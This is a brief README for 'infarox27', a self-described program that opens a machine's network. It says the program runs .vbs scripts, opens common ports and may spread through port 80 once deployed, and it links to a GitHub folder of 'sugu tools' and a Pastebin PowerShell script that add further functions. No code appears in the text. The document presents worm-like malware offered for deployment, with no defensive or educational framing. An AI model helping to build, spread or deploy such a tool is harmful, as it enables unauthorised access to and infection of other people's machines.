# infarox27
A small program to open a machine's network

Executes .vbs files and opens common ports (and maybe spreads through port 80) if functional

Disorganized because this is mostly just for hosting files and you need like 4 files and way to deploy it for it to function

# Additional Functionalities with:

#### `.x4` (sugu tools) - https://github.com/randyman777777777/thesillyzone/tree/main/x4

#### `.e` (PowerShell script) - https://pastebin.com/0XHnJ5c4
